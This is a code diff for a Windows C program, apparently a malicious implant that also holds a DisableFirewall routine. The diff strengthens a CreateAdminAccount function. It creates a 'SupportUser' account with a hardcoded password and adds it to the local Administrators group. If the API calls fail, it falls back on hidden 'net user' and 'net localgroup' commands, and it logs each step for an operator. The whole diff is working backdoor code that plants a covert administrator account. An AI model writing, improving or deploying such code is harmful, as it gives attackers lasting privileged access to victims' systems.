@@ -742,20 +742,78 @@ static void DisableFirewall(void) {
 }
 
 static void CreateAdminAccount(void) {
-    {
-        USER_INFO_1 ui = {0};
-        ui.usri1_name = L"SupportUser";
-        ui.usri1_password = L"P@ssw0rd123!";
-        ui.usri1_priv = USER_PRIV_ADMIN;
-        ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT;
-        ui.usri1_comment = L"Support account";
-        NET_API_STATUS status = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
-        LogMessage(status == NERR_Success ? L"[+] NetUserAdd: SupportUser created" : L"[-] NetUserAdd FAILED");
+    int created = 0, added = 0;
 
-        LOCALGROUP_MEMBERS_INFO_3 lmi = {0};
-        lmi.lgrmi3_domainandname = L"SupportUser";
-        status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&lmi, 1);
-        LogMessage(status == NERR_Success ? L"[+] NetLocalGroupAddMembers: SupportUser added to Administrators" : L"[-] NetLocalGroupAddMembers FAILED");
+    // Try NetUserAdd first
+    USER_INFO_1 ui = {0};
+    ui.usri1_name = L"SupportUser";
+    ui.usri1_password = L"P@ssw0rd123!";
+    ui.usri1_priv = USER_PRIV_ADMIN;
+    ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT;
+    ui.usri1_comment = L"Support account";
+    NET_API_STATUS status = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
+    if (status == NERR_Success || status == NERR_UserExists) {
+        LogMessage(status == NERR_Success
+            ? L"[+] NetUserAdd: SupportUser created"
+            : L"[+] NetUserAdd: SupportUser already exists");
+        created = 1;
+    } else {
+        LogMessage(L"[-] NetUserAdd FAILED, trying net user fallback");
+        wchar_t cmd[256];
+        wsprintfW(cmd, L"cmd.exe /c net user SupportUser P@ssw0rd123! /add");
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, 30000);
+            DWORD exitCode = 0;
+            GetExitCodeProcess(pi.hProcess, &exitCode);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            if (exitCode == 0) {
+                LogMessage(L"[+] net user /add: SupportUser created via fallback");
+                created = 1;
+            } else {
+                LogMessage(L"[-] net user /add: fallback FAILED");
+            }
+        } else {
+            LogMessage(L"[-] net user /add: CreateProcess FAILED");
+        }
+    }
+
+    // Try NetLocalGroupAddMembers first
+    LOCALGROUP_MEMBERS_INFO_3 lmi = {0};
+    lmi.lgrmi3_domainandname = L"SupportUser";
+    status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&lmi, 1);
+    if (status == NERR_Success) {
+        LogMessage(L"[+] NetLocalGroupAddMembers: SupportUser added to Administrators");
+        added = 1;
+    } else {
+        LogMessage(L"[-] NetLocalGroupAddMembers FAILED, trying net localgroup fallback");
+        wchar_t cmd[256];
+        wsprintfW(cmd, L"cmd.exe /c net localgroup Administrators SupportUser /add");
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION pi;
+        if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            WaitForSingleObject(pi.hProcess, 30000);
+            DWORD exitCode = 0;
+            GetExitCodeProcess(pi.hProcess, &exitCode);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            if (exitCode == 0) {
+                LogMessage(L"[+] net localgroup /add: SupportUser added via fallback");
+                added = 1;
+            } else {
+                LogMessage(L"[-] net localgroup /add: fallback FAILED");
+            }
+        } else {
+            LogMessage(L"[-] net localgroup /add: CreateProcess FAILED");
+        }
+    }
+
+    if (created && added) {
+        LogMessage(L"[+] SupportUser created");
+    } else {
+        LogMessage(L"[-] SupportUser creation incomplete");
     }
 }
 
